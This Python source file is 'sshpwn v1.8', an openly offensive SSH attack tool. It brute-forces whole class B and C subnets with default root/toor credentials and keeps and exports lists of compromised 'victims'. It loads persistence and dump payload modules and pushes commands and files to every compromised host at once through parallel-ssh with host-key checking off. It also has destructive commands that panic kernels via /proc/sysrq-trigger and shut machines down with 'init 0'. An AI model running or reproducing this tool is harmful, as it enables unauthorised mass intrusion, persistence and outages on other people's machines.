#!/usr/bin/python3

# sshpwn v1.8

# Copyright (c) 2016 Shawn Pang
# http://shawnpang.com
# Released under the MIT license

# TODO FOR SSHPWN 2.0
# DONE - Pssh and pscp fallback functions
# Multi-threading with execute
# Make more modules (download (with relative ~, splits "/" takes last as downloadfile name (one param))), upload, shutdown, fun stuff...)
# Add more configurations to config file (default timeout, log level)
# GUI improvements, better mode selection, greeting and time, flavour text
# Whitelist feature

import sys, os, time, threading
import misc.coloredstatus as cs
from queue import Queue
from pwn import *
from payloads.fun import *
from payloads.dump import *
from payloads.general import *
from payloads.persistence import *

# Set to 'debug' for debugging purposes
log_level = 'error'

def loadconfig():
    with log.progress("Loading config file...") as p:
        global configs
        try:
            configs = dict(config.split("#")[0].strip().split(" ") for config in open("config", "r") if config.strip() and config.split("#")[0].strip())
        except:
            print(cs.error, "Could not find config file! Exiting...")
            sys.exit(1)
        for key, value in configs.items():
            configs[key] = value.replace("~", os.path.expanduser("~"))
        p.status("")

def consolidatevictims(victims):
    print()
    
    if len(victims) == 0:
        print(cs.error, "Unable to connect to any user!")
        return 1

    for victim in victims:
        print(cs.good, "Connected to", victim.user + " at " + victim.host)
    print(cs.status, "Total connected users:", len(victims))
    return 0

def getvictimlist():

    mode = input("\n" + cs.status + " Enter 's' for single-user mode, 'm' for multi-user mode, 'b' for bruteforce mode: ")
    victims = []
    
    if mode == 's':
        login = input(cs.status + " Enter remote user: ")
        ip = input(cs.status + " Enter remote host: ")
        password = input(cs.status + " Enter password (if not using key): ")

        try:
            victims.append(ssh(user=login, host=ip, password=password, keyfile=configs["KeyFile"], timeout=10))
        except:
            pass

        # Consolidate Victim
        consolidateresult = consolidatevictims(victims)
        if consolidateresult == 1:
            return None
        else:
            return victims

    elif mode == 'm':
        def threader():
            while True:
                ip = q.get()
                multiuser(ip[0], ip[1])
                q.task_done()
        
        def multiuser(login, ip):
            try:
                context.log_level = log_level
                s = ssh(user=login, host=ip, password=password, keyfile=configs["KeyFile"], timeout=2)
                victims.append(s)
                #print
            except:
                pass
        
        # Configurations
        victimlist = input(cs.status + " Enter host file to use (hosts/hosts): ")
        victimlist = "hosts/hosts" if not victimlist else victimlist
        victimlist = list(entry.split("#")[0].strip().split("@") for entry in open(victimlist, "r") if entry.strip() and entry.split("#")[0].strip())

        password = input(cs.status + " Enter password to use (none): ")
        password = "toor" if not password else password

        threads = input(cs.status + " Enter number of threads to use (32): ")
        threads = 32 if not threads else int(threads)

        # Variables
        q = Queue()

        # Threading
        with log.progress("Running multi-user mode") as p:
            start = time.time()

            for workers in range(threads):
                t = threading.Thread(target=threader)
                t.daemon = True
                t.start()

            for victimentry in victimlist:
                q.put(victimentry)

            q.join()
            p.success("Done, took " + "{:.2f}".format(time.time() - start) + " seconds")
        # Threading End

        # Consolidate Victims 
        consolidateresult = consolidatevictims(victims)
        if consolidateresult == 1:
            return None
        else:
            return victims

    elif mode == 'b':
        def threader():
            while True:
                ip = q.get()
                bruteforce(ip)
                q.task_done()
        
        def bruteforce(ip):
            try:
                context.log_level = log_level
                s = ssh(user=login, host=ip, password=password, keyfile=configs["KeyFile"], timeout=2)
                victims.append(s)
            except:
                pass
            return

        # Configurations
        login = input(cs.status + " Enter username to use (root): ")
        login = "root" if not login else login

        password = input(cs.status + " Enter password to use (toor): ")
        password = "toor" if not password else password

        subnets = input(cs.status + " Enter subnets: (192.168.1) (comma seperate multiple) (dash for range): ")
        subnets = "192.168.1" if not subnets else subnets
        subnets = list(subnet.strip() + "." for subnet in subnets.split(","))
        # Check if a range was entered
        subnetrange = len(subnets) == 1 and "-" in subnets[0]
        if subnetrange:
            octets = subnets[0].split(".")
            firstoctet = octets[0]
            secondoctet = octets[1]
            lastoctet = octets[2]
            lastoctetrange = lastoctet.split("-")
            if len(lastoctetrange) != 2:
                print(cs.error, "Invalid subnet range! Usage: 192.168.6-20")
                return None
            rangestart = int(lastoctetrange[0])
            rangeend = int(lastoctetrange[1]) + 1
        
        threads = input(cs.status + " Enter number of threads to use (256): ")
        threads = 256 if not threads else int(threads)

        # Variables
        q = Queue()

        # Threading
        with log.progress("Running bruteforce mode") as p:
            start = time.time()

            for workers in range(threads):
                t = threading.Thread(target=threader)
                t.daemon = True
                t.start()
            
            # Class B Entire Network
            if subnets[0].count('.') == 2:
                for subnet in subnets:
                    for i in range(255):
                        for k in range(255):
                            q.put(subnet + str(i) + '.' + str(k))
            
            # Class B Network Range
            elif subnetrange:
                for i in range(rangestart, rangeend):
                    for k in range(255):
                        q.put(firstoctet + '.' + secondoctet + '.' + str(i) + '.' + str(k))
            
            # Class C Entire Network
            elif subnets[0].count('.') == 3:
                for subnet in subnets:
                    for i in range(255):
                        q.put(subnet + str(i))
            
            # Class A currently not supported, too big
            else:
                print(cs.error, "Invalid ip subnet format!")
                return None

            q.join()
            p.success("Done, took " + "{:.2f}".format(time.time() - start) + " seconds")
        # Threading End

        # Consolidate Victims 
        consolidateresult = consolidatevictims(victims)
        if consolidateresult == 1:
            return None
        else:
            return victims

    else:
        print(cs.error, "Unknown mode '" + mode + "'")
        return None

def builtincmd(cmd, victims):
     
    def parallelssh(victims, cmd):
        hoststring = ""
        for victim in victims:
            hoststring += victim.user + "@" + victim.host + " "    
        print()
        os.system("parallel-ssh -i -O StrictHostKeyChecking=no -t 1 -p 10 -H \"" + hoststring + "\" -A \"" + cmd + "\"")

    def parallelscp(victims, local, remote):
        hoststring = ""
        for victim in victims:
            hoststring += victim.user + "@" + victim.host + " "    
        print()
        os.system("parallel-scp -O StrictHostKeyChecking=no -t 1 -p 10 -H \"" + hoststring + "\" -A " + local + " " + remote)

    if not cmd[0]:
        return 2
    elif cmd[0] == "help":
        print("Built-in commands:\nhelp, back, exit, victims, configs, export\n")
        os.system("ls -lR payloads/ --hide=*.pyc --hide=__pycache__ --hide=__init__.py")
        return 2
    elif cmd[0] == "back":
        return 1
    elif cmd[0] == "exit" or cmd[0] == "quit":
        print("\n" + cs.status, "Exiting...")
        sys.exit(0)
    elif cmd[0] == "victims":
        consolidatevictims(victims)
        return 2
    elif cmd[0] == "configs":
        print()
        for config, value in configs.items():
            print("{:20}-   {}".format(config, value))
        return 2
    elif cmd[0] == "export":
        def usage():
            print(cs.status, "Usage: export [format: userip, iponly] [output location]")
        if len(cmd) != 2:
            usage()
            return 2
        params = cmd[1].split(" ")
        if len(params) != 2:
            usage()
            return 2
        elif params[0] != "userip" and params[0] != "iponly":
            print(cs.error, "Unknown format '" + params[0] + "'")
            return 2

        print("\n" + cs.status, "Exporting connected users list with '" + params[0] + "' mode...")
        
        existingvictims = []
        try:
            existingvictims = list(entry.split("#")[0].strip() for entry in open(params[1], "r") if entry.strip() and entry.split("#")[0].strip())
        except FileNotFoundError:
            pass
        
        if params[0] == "userip":
            currentvictims = list(victim.user + "@" + victim.host for victim in victims)
        elif params[0] == "iponly":
            currentvictims = list(victim.host for victim in victims)

        newvictims = list(victim for victim in currentvictims if victim not in existingvictims)

        output = open(params[1], 'a')
        for victim in newvictims:
            output.write(victim + "\n")
        output.close()

        print(cs.good, len(newvictims), "new user(s) added to", params[1])
        
        return 2

    # Parallel-SSH and Parallel-SCP fallback commands
    elif cmd[0] == "p-command":
        def usage():
            print(cs.status, "Usage: p-command [command]")
        if len(cmd) < 2:
            usage()
            return 2

        parallelssh(victims, cmd[1])
        return 2

    elif cmd[0] == "p-upload":
        def usage():
            print(cs.status, "Usage: p-upload [local] [remote]")
        if len(cmd) < 2:
            usage()
            return 2
        directories = cmd[1].split(" ")
        if len(directories) != 2:
            usage()
            return 2

        parallelscp(victims, directories[0], directories[1])
        return 2

    elif cmd[0] == "p-freeze":
        with log.progress("Panicking them kernels") as p:
            parallelssh(victims, "echo c > /proc/sysrq-trigger")
            p.status("")    
        return 2

    elif cmd[0] == "p-shutdown":
        with log.progress("Initializing zeros") as p:
            parallelssh(victims, "init 0")
            p.status("")
        return 2

def execute(cmd, victim):
    #try:
    context.log_level = log_level
    result = eval(cmd[0] + ".execute(victim, configs, " + ("cmd[1]" if len(cmd) > 1 else "params=None") + ")")
    #except NameError:
     #   print(cs.error, "Payload not found!")
      #  return 1

    if result == 0:
        print(cs.special, "Payload successful on", victim.host)
        return 0
    elif result == 1:
        return 1
    else:
        print(cs.error, "Payload failed on", victim.host)
        return 2

def main():

    try:
        #context.log_level = 'error'
        loadconfig()

        while True:
            victims = getvictimlist()
            if not victims:
                continue

            while True:
                sshpwncmd = input("\n" + cs.command + " sshpwn > ")
                sshpwntokens = sshpwncmd.split(" ", 1)

                builtincmdcode = builtincmd(sshpwntokens, victims)
                if builtincmdcode == 1:
                    break
                elif builtincmdcode == 2:
                    continue

                for victim in victims:
                    exitcode = execute(sshpwntokens, victim)
                    if exitcode == 1:
                        break
                    elif exitcode == 2:
                        continue    

    except KeyboardInterrupt:
        print("\n" + cs.status, "Exiting...")

if __name__ == "__main__":
    main()
